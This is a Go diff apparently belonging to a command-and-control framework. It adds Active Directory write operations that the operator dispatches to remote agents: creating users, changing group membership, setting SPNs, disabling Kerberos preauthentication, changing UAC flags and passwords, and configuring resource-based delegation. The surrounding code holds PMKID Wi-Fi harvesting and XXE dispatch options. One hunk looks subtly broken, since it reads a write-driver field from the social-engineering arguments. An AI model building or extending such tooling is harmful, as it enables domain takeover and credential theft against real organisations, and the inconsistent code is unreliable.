@@ -156,6 +156,17 @@ func main() {
 	adBindDN := flag.String("ad-bind-dn", "", "LDAP bind DN")
 	adBindPW := flag.String("ad-bind-pw", "", "LDAP bind password")
 	adBaseDN := flag.String("ad-base-dn", "", "search base (auto via RootDSE if empty)")
+	adWrite := flag.String("ad-write", "", "write driver: add_user|add_to_group|remove_from_group|set_attr|del_attr|add_spn|remove_spn|set_uac|add_uac|set_dontpreauth|clear_dontpreauth|set_primary_group|modify_pw|set_rbcd")
+	adTargetDN := flag.String("ad-target-dn", "", "target DN (write)")
+	adGroupDN := flag.String("ad-group-dn", "", "group DN (add_to_group)")
+	adAttrName := flag.String("ad-attr-name", "", "attribute name (set_attr / add_user)")
+	adAttrValue := flag.String("ad-attr-value", "", "attribute value (set_attr)")
+	adPassword := flag.String("ad-password", "", "password (add_user / modify_pw)")
+	adUACValue := flag.Uint("ad-uac-value", 0, "UAC value (set_uac / add_uac flag)")
+	adUACCurrent := flag.Uint("ad-uac-current", 0, "current UAC value (add_uac / dontpreauth)")
+	adSPN := flag.String("ad-spn", "", "SPN (add_spn / remove_spn)")
+	adPrimaryGID := flag.Uint("ad-primary-gid", 0, "primaryGroupID (set_primary_group)")
+	adEncodedSD := flag.String("ad-encoded-sd", "", "encoded security descriptor (set_rbcd)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -517,16 +528,27 @@ func main() {
 		})
 	}
 
-	// adenum dispatch — AD enumeration via the first agent
-	if *adEnum != "" {
+	// adenum dispatch — AD enumeration OR write via the first agent
+	if *adEnum != "" || *adWrite != "" {
 		go runAdEnumDispatch(mgr, adEnumArgs{
-			Action: *adEnum,
-			Host:   *adHost,
-			Port:   *adPort,
-			TLS:    *adTLS,
-			BindDN: *adBindDN,
-			BindPW: *adBindPW,
-			BaseDN: *adBaseDN,
+			Action:      *adEnum,
+			Host:        *adHost,
+			Port:        *adPort,
+			TLS:         *adTLS,
+			BindDN:      *adBindDN,
+			BindPW:      *adBindPW,
+			BaseDN:      *adBaseDN,
+			WriteDriver: *adWrite,
+			TargetDN:    *adTargetDN,
+			GroupDN:     *adGroupDN,
+			AttrName:    *adAttrName,
+			AttrValue:   *adAttrValue,
+			Password:    *adPassword,
+			UACValue:    uint32(*adUACValue),
+			UACCurrent:  uint32(*adUACCurrent),
+			SPN:         *adSPN,
+			PrimaryGID:  uint32(*adPrimaryGID),
+			EncodedSD:   *adEncodedSD,
 		})
 	}
 
@@ -1182,11 +1204,16 @@ func runSocialDispatch(mgr *session.Manager, a socialArgs) {
 
 	req := proto.SocialStart{
 		SessionID: sessionID,
-		Action:    a.Action,
-		User:      a.User,
-		Email:     a.Email,
-		Domain:    a.Domain,
-		Threads:   a.Threads,
+		Action: func() string {
+			if a.WriteDriver != "" {
+				return "write"
+			}
+			return a.Action
+		}(),
+		User:    a.User,
+		Email:   a.Email,
+		Domain:  a.Domain,
+		Threads: a.Threads,
 	}
 	if err := s.SendSocialStart(sessionID, req); err != nil {
 		log.Printf("[social] start: %v", err)
@@ -1319,13 +1346,24 @@ func runWebXXEDispatch(mgr *session.Manager, a webXXEArgs) {
 
 // adEnumArgs carries the operator's -ad* flags.
 type adEnumArgs struct {
-	Action string
-	Host   string
-	Port   int
-	TLS    bool
-	BindDN string
-	BindPW string
-	BaseDN string
+	Action      string
+	Host        string
+	Port        int
+	TLS         bool
+	BindDN      string
+	BindPW      string
+	BaseDN      string
+	WriteDriver string
+	TargetDN    string
+	GroupDN     string
+	AttrName    string
+	AttrValue   string
+	Password    string
+	UACValue    uint32
+	UACCurrent  uint32
+	SPN         string
+	PrimaryGID  uint32
+	EncodedSD   string
 }
 
 // runAdEnumDispatch waits for the first agent, fires an AdEnumStart.
@@ -1339,14 +1377,25 @@ func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
 	log.Printf("[adenum] %s @ %s:%d -> %s", a.Action, a.Host, a.Port, s.AgentID)
 
 	req := proto.AdEnumStart{
-		SessionID: sessionID,
-		Action:    a.Action,
-		Host:      a.Host,
-		Port:      a.Port,
-		UseTLS:    a.TLS,
-		BindDN:    a.BindDN,
-		BindPW:    a.BindPW,
-		BaseDN:    a.BaseDN,
+		SessionID:   sessionID,
+		Action:      a.Action,
+		Host:        a.Host,
+		Port:        a.Port,
+		UseTLS:      a.TLS,
+		BindDN:      a.BindDN,
+		BindPW:      a.BindPW,
+		BaseDN:      a.BaseDN,
+		WriteDriver: a.WriteDriver,
+		TargetDN:    a.TargetDN,
+		GroupDN:     a.GroupDN,
+		AttrName:    a.AttrName,
+		AttrValue:   a.AttrValue,
+		Password:    a.Password,
+		UACValue:    a.UACValue,
+		UACCurrent:  a.UACCurrent,
+		SPN:         a.SPN,
+		PrimaryGID:  a.PrimaryGID,
+		EncodedSD:   a.EncodedSD,
 	}
 	if err := s.SendAdEnumStart(sessionID, req); err != nil {
 		log.Printf("[adenum] start: %v", err)
